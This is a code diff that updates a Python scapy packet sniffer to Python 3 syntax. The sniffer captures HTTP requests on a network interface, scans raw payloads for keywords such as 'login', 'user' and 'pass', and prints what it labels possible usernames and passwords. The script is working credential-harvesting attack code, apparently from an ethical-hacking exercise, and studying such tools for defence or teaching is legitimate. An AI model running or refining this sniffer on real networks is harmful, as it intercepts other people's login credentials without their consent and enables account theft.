@@ -19,7 +19,7 @@ def geturl(packet):
 
 def get_login_info(packet):
     if packet.haslayer(scapy.Raw):
-        load = packet[scapy.Raw].load
+        load = str(packet[scapy.Raw].load)
         keywords = ['login', 'LOGIN', 'user', 'pass', 'username', 'password', 'Login']
 
         for keyword in keywords:
@@ -32,14 +32,12 @@ def process_sniffed_packet(packet):
         # print packet.show()
 
         url = geturl(packet)
-        print
-        "[+]HTTPRequest > " + url
+        print("[+]HTTPRequest > " + url.decode())
 
-        logininfo = get_login_info(packet)
+        login_info = get_login_info(packet)
 
-        if logininfo:
-            print
-            "\n\n[+]Possible username and password " + logininfo + "\n\n"
+        if login_info:
+            print("\n\n[+]Possible username and password " + login_info + "\n\n")
 
 
 sniff(options.interface)
